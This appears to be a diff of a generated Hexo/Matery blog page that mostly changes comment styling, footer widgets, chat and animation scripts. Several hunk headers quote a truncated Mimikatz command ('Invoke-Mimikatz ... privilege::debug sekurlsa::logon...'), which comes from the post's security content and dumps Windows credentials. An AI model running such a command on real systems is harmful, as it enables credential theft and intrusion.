+    #vcomments ul li,
+    ol li {
+        display: list-item;
+        line-height: 1.8rem;
+        font-size: 1rem;
+    }
+
+    #vcomments ul li {
+        list-style-type: disc;
+    }
+
+    #vcomments ul ul li {
+        list-style-type: circle;
+    }
+
+    #vcomments table, th, td {
+        padding: 12px 13px;
+        border: 1px solid #dfe2e5;
+    }
+
+    #vcomments table, th, td {
+        border: 0;
+    }
+
+    table tr:nth-child(2n), thead {
+        background-color: #fafafa;
+    }
+
+    #vcomments table th {
+        background-color: #f2f2f2;
+        min-width: 80px;
+    }
+
+    #vcomments table td {
+        min-width: 80px;
+    }
+
+    #vcomments h1 {
+        font-size: 1.85rem;
+        font-weight: bold;
+        line-height: 2.2rem;
+    }
+
+    #vcomments h2 {
+        font-size: 1.65rem;
+        font-weight: bold;
+        line-height: 1.9rem;
+    }
+
+    #vcomments h3 {
+        font-size: 1.45rem;
+        font-weight: bold;
+        line-height: 1.7rem;
+    }
+
+    #vcomments h4 {
+        font-size: 1.25rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    #vcomments h5 {
+        font-size: 1.1rem;
+        font-weight: bold;
+        line-height: 1.4rem;
+    }
+
+    #vcomments h6 {
+        font-size: 1rem;
+        line-height: 1.3rem;
+    }
+
+    #vcomments p {
+        font-size: 1rem;
+        line-height: 1.5rem;
+    }
+
+    #vcomments hr {
+        margin: 12px 0;
+        border: 0;
+        border-top: 1px solid #ccc;
+    }
+
+    #vcomments blockquote {
+        margin: 15px 0;
+        border-left: 5px solid #42b983;
+        padding: 1rem 0.8rem 0.3rem 0.8rem;
+        color: #666;
+        background-color: rgba(66, 185, 131, .1);
+    }
+
+    #vcomments pre {
+        font-family: monospace, monospace;
+        padding: 1.2em;
+        margin: .5em 0;
+        background: #272822;
+        overflow: auto;
+        border-radius: 0.3em;
+        tab-size: 4;
+    }
+
+    #vcomments code {
+        font-family: monospace, monospace;
+        padding: 1px 3px;
+        font-size: 0.92rem;
+        color: #e96900;
+        background-color: #f8f8f8;
+        border-radius: 2px;
+    }
+
+    #vcomments pre code {
+        font-family: monospace, monospace;
+        padding: 0;
+        color: #e8eaf6;
+        background-color: #272822;
+    }
+
+    #vcomments pre[class*="language-"] {
+        padding: 1.2em;
+        margin: .5em 0;
+    }
+
+    #vcomments code[class*="language-"],
+    pre[class*="language-"] {
+        color: #e8eaf6;
+    }
+
+    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
+        position: inherit;
+        margin-left: -1.3rem;
+        margin-right: 0.4rem;
+        margin-top: -1px;
+        vertical-align: middle;
+        left: unset;
+        visibility: visible;
+    }
+
+    #vcomments b,
+    strong {
+        font-weight: bold;
+    }
+
+    #vcomments dfn {
+        font-style: italic;
+    }
+
+    #vcomments small {
+        font-size: 85%;
+    }
+
+    #vcomments cite {
+        font-style: normal;
+    }
+
+    #vcomments mark {
+        background-color: #fcf8e3;
+        padding: .2em;
+    }
+
+    #vcomments table, th, td {
+        padding: 12px 13px;
+        border: 1px solid #dfe2e5;
+    }
+
+    table tr:nth-child(2n), thead {
+        background-color: #fafafa;
+    }
+
+    #vcomments table th {
+        background-color: #f2f2f2;
+        min-width: 80px;
+    }
+
+    #vcomments table td {
+        min-width: 80px;
+    }
+
+    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
+        position: inherit;
+        margin-left: -1.3rem;
+        margin-right: 0.4rem;
+        margin-top: -1px;
+        vertical-align: middle;
+        left: unset;
+        visibility: visible;
+    }
+</style>
+
+<div class="card valine-card" data-aos="fade-up">
+    <div class="comment_headling" style="font-size: 20px; font-weight: 700; position: relative; padding-left: 20px; top: 15px; padding-bottom: 5px;">
+        <i class="fas fa-comments fa-fw" aria-hidden="true"></i>
+        <span>评论</span>
+    </div>
+    <div id="vcomments" class="card-content" style="display: grid">
+    </div>
+</div>
+
+<script src="/libs/valine/av-min.js"></script>
+<script src="/libs/valine/Valine.min.js"></script>
+<script>
+    new Valine({
+        el: '#vcomments',
+        appId: 'fYyLqrwhVuigWcIYcP9sPbBv-MdYXbMMI',
+        appKey: 'ht8iOzVaHwm0miBUeumGrxDF',
+        serverURLs: '',
+        notify: 'false' === 'true',
+        verify: 'false' === 'true',
+        visitor: 'true' === 'true',
+        avatar: 'mm',
+        pageSize: '10',
+        lang: 'zh-cn',
+        placeholder: 'just go go'
+    });
+</script>
+
+<!--酷Q推送-->
+
 
     
 
@@ -1569,9 +1803,12 @@ powershell Invoke-Mimikatz -Command ‘“privilege::debug” “sekurlsa::logon
 <!-- 代码块功能依赖 -->
 <script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
 
-<!-- 代码语言 -->
 
-<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+  <!-- 是否加载使用自带的 prismjs. -->
+  <script type="text/javascript" src="/libs/prism/prism.js"></script>
+
+
+<!-- 代码语言 -->
 
 
 <!-- 代码块复制 -->
@@ -1581,7 +1818,6 @@ powershell Invoke-Mimikatz -Command ‘“privilege::debug” “sekurlsa::logon
 
 <!-- 代码块收缩 -->
 
-<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
 
 
     </div>
@@ -1611,19 +1847,6 @@ powershell Invoke-Mimikatz -Command ‘“privilege::debug” “sekurlsa::logon
             headingsOffset: -($(window).height() * 0.4 - 45),
             collapseDepth: Number('0'),
             headingSelector: 'h2, h3, h4'
-        });
-
-        // modify the toc link href to support Chinese.
-        let i = 0;
-        let tocHeading = 'toc-heading-';
-        $('#toc-content a').each(function () {
-            $(this).attr('href', '#' + tocHeading + (++i));
-        });
-
-        // modify the heading title id to support Chinese.
-        i = 0;
-        $('#articleContent').children('h2, h3, h4').each(function () {
-            $(this).attr('id', tocHeading + (++i));
         });
 
         // Set scroll toc fixed.
@@ -1687,89 +1910,42 @@ powershell Invoke-Mimikatz -Command ‘“privilege::debug” “sekurlsa::logon
 
     <footer class="page-footer bg-color">
     
-        <link rel="stylesheet" href="/libs/aplayer/APlayer.min.css">
-<style>
-    .aplayer .aplayer-lrc p {
-        
-        display: none;
-        
-        font-size: 12px;
-        font-weight: 700;
-        line-height: 16px !important;
-    }
 
-    .aplayer .aplayer-lrc p.aplayer-lrc-current {
-        
-        display: none;
-        
-        font-size: 15px;
-        color: #42b983;
-    }
-
-    
-    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
-        left: -66px !important;
-    }
-
-    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
-        left: 0px !important;
-    }
-
-    
-</style>
-<div class="">
-    
-    <div class="row">
-        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
-                   server="netease"
-                   type="playlist"
-                   id="503838841"
-                   fixed='true'
-                   autoplay='false'
-                   theme='#42b983'
-                   loop='all'
-                   order='random'
-                   preload='auto'
-                   volume='0.7'
-                   list-folded='true'
-        >
-        </meting-js>
-    </div>
-</div>
-
-<script src="/libs/aplayer/APlayer.min.js"></script>
-<script src="https://cdn.jsdelivr.net/npm/meting@2/dist/Meting.min.js"></script>
-
-    
-    <div class="container row center-align" style="margin-bottom: 0px !important;">
+    <div class="container row center-align"
+         style="margin-bottom: 0px !important;">
         <div class="col s12 m8 l8 copy-right">
             Copyright&nbsp;&copy;
             
                 <span id="year">2019-2024</span>
             
-            <span id="year">2019</span>
             <a href="/about" target="_blank">hybcx</a>
             |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
             |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            
             <br>
             
+                &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
+                        class="white-color">861.1k</span>
             
             
             
+                
             
             
-            <span id="busuanzi_container_site_pv">
-                |&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;<span id="busuanzi_value_site_pv"
-                    class="white-color"></span>&nbsp;次
+                <span id="busuanzi_container_site_pv">
+                &nbsp;|&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;
+                    <span id="busuanzi_value_site_pv" class="white-color"></span>
             </span>
             
             
-            <span id="busuanzi_container_site_uv">
-                |&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;<span id="busuanzi_value_site_uv"
-                    class="white-color"></span>&nbsp;人
+                <span id="busuanzi_container_site_uv">
+                &nbsp;|&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;
+                    <span id="busuanzi_value_site_uv" class="white-color"></span>
             </span>
             
             <br>
+
+            <!-- 运行天数提醒. -->
             
             <br>
             
@@ -1916,6 +2092,30 @@ $(function () {
 });
 </script>
 
+    <!-- 白天和黑夜主题 -->
+<div class="stars-con">
+    <div id="stars"></div>
+    <div id="stars2"></div>
+    <div id="stars3"></div>  
+</div>
+
+<script>
+    function switchNightMode() {
+        $('<div class="Cuteen_DarkSky"><div class="Cuteen_DarkPlanet"></div></div>').appendTo($('body')),
+        setTimeout(function () {
+            $('body').hasClass('DarkMode') 
+            ? ($('body').removeClass('DarkMode'), localStorage.setItem('isDark', '0'), $('#sum-moon-icon').removeClass("fa-sun").addClass('fa-moon')) 
+            : ($('body').addClass('DarkMode'), localStorage.setItem('isDark', '1'), $('#sum-moon-icon').addClass("fa-sun").removeClass('fa-moon')),
+            
+            setTimeout(function () {
+            $('.Cuteen_DarkSky').fadeOut(1e3, function () {
+                $(this).remove()
+            })
+            }, 2e3)
+        })
+    }
+</script>
+
     <!-- 回到顶部按钮 -->
 <div id="backTop" class="top-scroll">
     <a class="btn-floating btn-large waves-effect waves-light" href="#!">
@@ -1930,6 +2130,33 @@ $(function () {
     <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
     <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
     <script src="/js/matery.js"></script>
+
+    
+
+    
+    
+    
+        
+        <script type="text/javascript">
+            // 只在桌面版网页启用特效
+            var windowWidth = $(window).width();
+            if (windowWidth > 768) {
+                document.write('<script type="text/javascript" src="/libs/others/sakura.js"><\/script>');
+            }
+        </script>
+    
+
+    <!-- 雪花特效 -->
+    
+
+    <!-- 鼠标星星特效 -->
+    
+
+     
+        <script src="https://ssl.captcha.qq.com/TCaptcha.js"></script>
+        <script src="/libs/others/TencentCaptcha.js"></script>
+        <button id="TencentCaptcha" data-appid="xxxxxxxxxx" data-cbfn="callback" type="button" hidden></button>
+    
 
     <!-- Baidu Analytics -->
 
@@ -1957,10 +2184,39 @@ $(function () {
     
 
     
+        <script src="//code.tidio.co/7sfvbaabl5mp7up6avakdatk7dbm4xow.js"></script>
+        <script>
+            $(document).ready(function () {
+                setInterval(change_Tidio, 50);
+                function change_Tidio() {
+                    var tidio=$("#tidio-chat iframe");
+                    if(tidio.css("display")=="block"&& $(window).width()>977 ){
+                        document.getElementById("tidio-chat-iframe").style.bottom= ($("div#backTop.top-scroll").css("display")=="none" &&$(window).width()>977)>0? "-40px" : ($("div.toc-title").length&&$(window).width()>977)>0?"85px":"20px";
+                        document.getElementById("tidio-chat-iframe").style.right="-15px";
+                        document.getElementById("tidio-chat-iframe").style.height=parseInt(tidio.css("height"))>=520?"520px":tidio.css("height");
+                        document.getElementById("tidio-chat-iframe").style.zIndex="997";
+                    }
+                    else if(tidio.css("display")=="block"&&$(window).width()>601 &&$(window).width()<992 ){
+                        document.getElementById("tidio-chat-iframe").style.bottom= ($("div#backTop.top-scroll").css("display")=="none" && 601< $(window).width()<992)>0? "-40px":"20px" ;
+                        document.getElementById("tidio-chat-iframe").style.right="-15px";
+                        document.getElementById("tidio-chat-iframe").style.zIndex="997";
+                    }
+                    else if(tidio.css("display")=="block"&&$(window).width()<601 && parseInt(tidio.css("height"))<230){
+                        document.getElementById("tidio-chat-iframe").style.bottom= ($("div#backTop.top-scroll").css("display")=="none" && $(window).width()<601)>0? "-10px":"45px" ;
+                        document.getElementById("tidio-chat-iframe").style.zIndex="997";
+                    }
+                    if( tidio.css("display")=="block"&&$(window).width()<601 && parseInt(tidio.css("height"))>=230){
+                        document.getElementById("tidio-chat-iframe").style.zIndex="998";
+                    }
+                }
+            });
+        </script>
+    
 
     
 
-	
+    <!--腾讯兔小巢-->
+    
     
 
     
@@ -1971,6 +2227,6 @@ $(function () {
     <script src="/libs/instantpage/instantpage.js" type="module"></script>
     
 
-</body>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
 
 </html>
